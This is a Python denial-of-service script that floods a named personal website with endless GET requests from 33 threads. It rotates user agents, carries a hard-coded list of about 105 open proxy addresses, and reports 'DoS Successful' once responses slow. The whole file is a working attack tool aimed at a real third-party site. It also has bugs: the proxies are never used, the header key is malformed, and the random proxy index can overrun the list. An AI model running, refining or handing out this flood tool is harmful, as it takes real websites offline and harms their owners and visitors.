import requests
import threading
import time
import random
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

l = []
rl = []
def getproxies():
    prox = [
"https://36.89.180.173:8080",
"https://36.66.43.65:8080",
"https://103.83.178.202:8080",
"https://103.53.76.84:8080",
"https://103.135.225.195:3128",
"https://103.122.64.212:8080",
"https://118.99.122.162:8080",
"https://103.11.106.27:8181",
"https://120.89.90.230:80",
"https://114.121.248.251:8080",
"https://125.165.147.78:8080",
"https://103.144.18.74:8080",
"https://200.6.136.94:8080",
"https://177.36.201.58:8080",
"https://131.100.57.101:8080",
"https://45.175.173.55:8080",
"https://201.20.105.198:8080",
"https://177.130.140.80:8080",
"https://185.242.104.112:8080",
"https://178.47.141.85:2580",
"https://176.28.64.225:3128",
"https://178.205.169.210:3128",
"https://85.15.152.39:3128",
"https://1.20.217.52:8080",
"https://122.155.165.191:3128",
"https://202.80.231.67:8080",
"https://1.20.103.196:42792",
"https://183.88.226.50:8080",
"https://103.213.213.22:83",
"https://150.129.151.83:6666",
"https://103.159.67.54:8080",
"https://14.140.131.82:3128",
"https://103.52.220.106:83",
"https://91.217.60.202:3128",
"https://176.113.73.96:3128",
"https://167.99.112.188:8080",
"https://159.65.43.120:8080",
"https://167.99.126.178:8080",
"https://216.37.138.177:3128",
"https://104.237.255.195:3128",
"https://34.121.171.105:80",
"https://162.255.201.37:8080",
"https://176.113.73.100:3128",
"https://167.99.112.187:8080",
"https://167.99.59.104:8080",
"https://165.227.105.152:8080",
"https://27.147.209.215:8080",
"https://113.11.34.219:8080",
"https://103.109.58.54:8080",
"https://128.199.220.253:8080",
"https://174.138.26.20:8080",
"https://128.199.242.26:8080",
"https://206.189.44.99:8080",
"https://139.59.107.221:8080",
"https://159.65.2.252:8080",
"https://18.139.173.12:3128",
"https://128.199.96.20:8080",
"https://188.166.245.147:8080",
"https://206.189.44.89:8080",
"https://54.255.192.244:80",
"https://159.89.193.210:8080",
"https://128.199.237.213:8080",
"https://174.138.25.224:8080",
"https://36.37.177.186:8080",
"https://141.98.112.3:8080",
"https://103.161.176.82:8080",
"https://77.237.91.162:8080",
"https://185.4.30.50:3128",
"https://87.107.124.190:8080",
"https://159.69.66.224:8080",
"https://46.101.224.194:3128",
"https://188.166.162.1:3128",
"https://144.91.95.126:3128",
"https://62.171.177.80:3128",
"https://46.101.130.118:8080",
"https://51.178.220.22:443",
"https://178.32.129.31:3128",
"https://54.38.78.108:3128",
"https://185.44.81.187:8992",
"https://51.158.123.35:9999",
"https://132.248.196.2:8080",
"https://141.164.54.37:8080",
"https://188.166.126.55:8080",
"https://167.99.215.163:8080",
"https://167.172.37.26:8080",
"https://194.5.206.148:3128",
"https://95.141.36.112:8686",
"https://103.124.97.11:8080",
"https://202.61.51.204:3128",
"https://115.42.65.14:8080",
"https://144.217.101.245:3129",
"https://178.62.127.204:8080",
"https://46.101.83.76:8080",
"https://159.65.17.37:3128",
"https://18.130.101.89:3128",
"https://178.62.61.32:8080",
"https://188.240.71.213:3128",
"https://124.106.224.5:8080",
"https://89.40.48.186:8080",
"https://203.74.120.79:3128",
"https://45.173.73.114:8080",
"https://51.223.255.123:8080",
"https://78.110.7.192:3128",
"https://95.217.34.209:3128"
]
    ran = random.randint(1,105)
    return prox[ran]

def current_mil_time():
	return round(time.time() * 1000)

def current_sec_time():
	return round(time.time())

def count_resp_per_sec(time_took):
	t = current_sec_time()
	l.append({
		"time_took": time_took,
		"time_received": t,
	})
	
	for e in l:
		if current_sec_time() - e["time_received"] >= 1:
			l.remove(e)

def count_req_per_sec():
	t = current_sec_time()
	rl.append({
		"time_received": t,
	})
	
	for e in rl:
		if current_sec_time() - e["time_received"] >= 1:
			rl.remove(e)
	
message = "DoSing..."
def make_request(name):
	while True:
		count_req_per_sec()
		try:

			software_names = [SoftwareName.CHROME.value]
			operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   
			user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=1000)
			s = current_mil_time()
			user_agent = user_agent_rotator.get_user_agents()
			headers = {'User Agent': user_agent}
			proxies = getproxies()
			r = requests.get('https://santhoshsivam.github.io/CV',headers=headers)
			t = current_mil_time() - s
			# print("Response code from thread #{}: {} took {} ms".format(name, str(r.status_code), t))
			count_resp_per_sec(t)
		except:
			message = "DoS Successful. Site looks down for now."
		
threads = 32
i=0
while i <= threads:
	x = threading.Thread(target=make_request, args=(i,))
	print("Starting thread #{}...".format(i))
	x.start()
	i+=1
	

print("Calculating... wait for a while for it to adjust...")
while True:
	response_time = 0
	for e in l:
		response_time = response_time + e['time_took']
	if(len(l)) > 0:
		response_time = response_time / len(l)
	if response_time > 60000:
		message = "DoS Successful. Site looks down for now."
	else:
		message = "DoSing..."
	print("\rAverage response time: {}ms; Requests/sec: {}; Responses/sec: {}; {}".format(round(response_time, 2), len(rl), len(l), message), end=""),


		
	
